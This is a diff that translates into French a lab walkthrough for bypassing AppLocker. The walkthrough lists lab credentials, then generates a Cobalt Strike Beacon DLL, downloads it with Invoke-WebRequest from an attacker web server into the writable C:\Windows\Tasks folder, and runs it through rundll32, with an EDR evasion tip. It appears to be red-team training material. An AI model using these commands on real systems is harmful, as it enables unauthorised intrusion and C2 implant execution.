@@ -1,8 +1,8 @@
-# AppLocker Challenge
+# Challenge AppLocker
 
 **Objectif :** contourner AppLocker pour exécuter un Beacon sur la workstation cible.
 
-| Hôte | Credentials |
+| Hôte | Identifiants |
 |------|-------------|
 | `lon-wkstn-1` | `CONTOSO\pchilds` / `Passw0rd!` |
 | `lon-dc-1` | `CONTOSO\Administrator` / `Passw0rd!` |
@@ -31,11 +31,11 @@ icacls C:\Windows\Temp
 
 | Contrôle | Résultat |
 |-------|--------|
-| Language mode | `ConstrainedLanguage` — AppLocker appliqué |
-| DLL rules | **Aucune** — contrôle des DLL désactivé |
+| Mode PowerShell | `ConstrainedLanguage` — AppLocker appliqué |
+| Règles DLL | **Aucune** — contrôle des DLL désactivé |
 | `C:\Windows\Tasks` | `Authenticated Users:(RX,WD)` — **écriture autorisée** |
 | `C:\Windows\Temp` | Accès refusé à pchilds |
-| Rules in place | Uniquement les règles par défaut — `%WINDIR%\*` and `%PROGRAMFILES%\*` pour Everyone |
+| Règles appliquées | Uniquement les règles par défaut — `%WINDIR%\*` et `%PROGRAMFILES%\*` pour Everyone |
 
 **Méthode de bypass :** `rundll32` charge une DLL déposée dans `C:\Windows\Tasks`.
 - `rundll32.exe` se trouve dans `%WINDIR%\System32\` et correspond à la règle d’autorisation `%WINDIR%\*`
@@ -45,7 +45,7 @@ icacls C:\Windows\Temp
 
 ---
 
-## Étape 2 — Générer une DLL Beacon stageless (Attacker Desktop — CS)
+## Étape 2 — Préparer une DLL Beacon stageless sur l’Attacker Desktop
 
 ```
 Cobalt Strike > Payloads > Windows Stageless Payload
@@ -56,7 +56,7 @@ Cobalt Strike > Payloads > Windows Stageless Payload
 
 ---
 
-## Étape 3 — Héberger le payload sur le Web Server CS
+## Étape 3 — Héberger le payload sur le serveur web Cobalt Strike
 
 ```
 Site Management > Host File
@@ -75,7 +75,7 @@ Confirmation dans Cobalt Strike :
 
 ---
 
-## Étape 4 — Télécharger la DLL Beacon sur lon-wkstn-1
+## Étape 4 — Télécharger la DLL Beacon sur `lon-wkstn-1`
 
 Sur `lon-wkstn-1`, sous `pchilds`, `Invoke-WebRequest` fonctionne en mode ConstrainedLanguage :
 
@@ -86,17 +86,17 @@ Invoke-WebRequest -Uri 'http://10.0.0.5:80/beacon.dll' -OutFile 'C:\Windows\Task
 
 ---
 
-## Étape 5 — Exécuter avec rundll32
+## Étape 5 — Exécution via `rundll32`
 
 ```cmd
 rundll32.exe C:\Windows\Tasks\beacon.dll,StartW
 ```
 
-> **OPSEC-🟠CAUTION:** `rundll32` est visible par l’EDR. La DLL Beacon exporte `StartW` pour cet appel. Vérifier `spawnto` dans le Malleable C2 Profile avant de générer le payload.
+> **OPSEC-🟠CAUTION :** `rundll32` est visible par l’EDR. La DLL Beacon exporte `StartW` pour cet appel. Vérifier `spawnto` dans le Malleable C2 Profile avant de générer le payload.
 
 ---
 
-## Étape 6 — Récupérer le Beacon dans Cobalt Strike
+## Étape 6 — Vérifier le Beacon dans Cobalt Strike
 
 ```
 View > Beacons
